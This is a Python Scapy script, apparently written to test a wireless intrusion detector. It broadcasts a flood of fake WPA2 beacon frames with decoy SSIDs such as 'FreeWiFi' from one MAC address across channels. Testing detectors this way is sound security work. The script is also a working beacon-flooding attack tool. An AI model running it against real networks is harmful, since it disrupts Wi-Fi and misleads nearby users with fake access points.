#!/usr/bin/env python3
"""
Beacon Spam Test Script - Generates multiple beacon frames to test WIDS detection

This script sends a large number of beacon frames with different SSIDs from the same 
MAC address to simulate a beacon flooding attack and trigger the BeaconSpamDetector 
in your WIDS.

Usage:
  sudo python3 beacon_spam_test.py <interface> [number_of_beacons] [delay]

Requirements:
  - Scapy
  - Root/sudo privileges
  - Wireless interface in monitor mode
"""

import os
import sys
import time
import random
from scapy.all import sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt

# Some fake network names to use in beacon frames
FAKE_NETWORKS = [
    "FreeWiFi", "PublicHotspot", "Guest_Network", "Airport_WiFi", 
    "CoffeeShop", "Hotel_Guest", "Default_SSID", "OpenNetwork", 
    "PublicAccess", "FreeInternet", "WebConnect", "WiFi-Hotspot",
    "Connect_Here", "Internet_Access", "PublicWLAN", "WiFi_Zone",
    "Network", "Wireless", "WiFi", "Hotspot", "Free_WiFi", 
    "Public_WiFi", "Open_WiFi", "WiFi_Access", "Internet"
]

def generate_random_mac():
    """Generate a random MAC address."""
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def send_beacon_frames(interface, num_beacons=100, delay=0.05, duration=30):
    """
    Send multiple beacon frames to simulate a beacon flooding attack.
    
    Args:
        interface: Wireless interface in monitor mode
        num_beacons: Number of beacon frames to send
        delay: Delay between beacon frames in seconds
        duration: How long to run the attack in seconds
    """
    # Use the same source MAC for all beacons to trigger detection
    src_mac = generate_random_mac()
    
    # Select a fixed number of networks to make constant beacons for
    if num_beacons > len(FAKE_NETWORKS):
        # Use all available network names
        networks = FAKE_NETWORKS.copy()
        # Add some with random numbers to get to the desired count
        for i in range(len(FAKE_NETWORKS), num_beacons):
            networks.append(f"{random.choice(FAKE_NETWORKS)}_{random.randint(1, 999)}")
    else:
        networks = FAKE_NETWORKS[:num_beacons]
    
    # Generate beacon frames for each network
    frames = []
    channels = []
    
    print(f"Creating {num_beacons} fake networks with MAC {src_mac}...")
    
    for i, network in enumerate(networks):
        # Use a fixed channel for each network for better visibility
        channel = (i % 11) + 1
        channels.append(channel)
        
        # Create a beacon frame
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", 
                      addr2=src_mac, addr3=src_mac)
        
        # Create beacon layer with more complete capabilities
        beacon = Dot11Beacon(cap='ESS+privacy')
        
        # Add SSID, supported rates, channel and additional information
        essid = Dot11Elt(ID='SSID', info=network, len=len(network))
        rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        dsset = Dot11Elt(ID='DSset', info=chr(channel).encode())
        
        # Add RSN (802.11i) for WPA2 appearance
        rsn = Dot11Elt(ID=48, info=(
            b'\x01\x00'              # RSN Version 1
            b'\x00\x0f\xac\x04'      # Group Cipher Suite : CCMP (AES)
            b'\x01\x00'              # 1 Pairwise Cipher Suite
            b'\x00\x0f\xac\x04'      # Pairwise Cipher Suite : CCMP (AES)
            b'\x01\x00'              # 1 Authentication Key Management Suite
            b'\x00\x0f\xac\x02'      # Authentication Key Management : PSK
            b'\x00\x00'              # RSN Capabilities
        ))
        
        # Create the frame
        frame = RadioTap()/dot11/beacon/essid/rates/dsset/rsn
        frames.append(frame)
        
        print(f"[{i+1}/{num_beacons}] Created beacon for: {network} on channel {channel}")
    
    print(f"\nBroadcasting {num_beacons} fake networks for {duration} seconds...")
    print("Networks should now be visible on your phone's WiFi scanner.")
    
    # Send beacons continuously for the specified duration
    start_time = time.time()
    count = 0
    
    try:
        while time.time() - start_time < duration:
            for i, frame in enumerate(frames):
                sendp(frame, iface=interface, verbose=0)
                count += 1
                
                # Every 1000 packets, show progress
                if count % 1000 == 0:
                    elapsed = time.time() - start_time
                    remaining = max(0, duration - elapsed)
                    print(f"Sent {count} beacons. {remaining:.1f}s remaining...")
                
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\nStopped by user.")
    
    total_sent = count
    print(f"\nSent {total_sent} beacon frames for {num_beacons} fake networks")
    print("Check your WIDS for 'Beacon Spam' detection alerts!")

if __name__ == "__main__":
    # If not run with sudo, set up virtual environment and re-run with sudo
    if os.geteuid() != 0:
        print("This script requires root privileges. Setting up virtual environment...")
        sys.exit(0)

    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <interface> [number_of_beacons] [delay] [duration]")
        sys.exit(1)
        
    interface = sys.argv[1]
    
    num_beacons = 25  # Default number of beacons (reduced to be more manageable)
    if len(sys.argv) > 2:
        num_beacons = int(sys.argv[2])
        
    delay = 0.01  # Default delay between beacons (faster for better visibility)
    if len(sys.argv) > 3:
        delay = float(sys.argv[3])
    
    duration = 60  # Default duration in seconds
    if len(sys.argv) > 4:
        duration = int(sys.argv[4])
    
    send_beacon_frames(interface, num_beacons, delay, duration)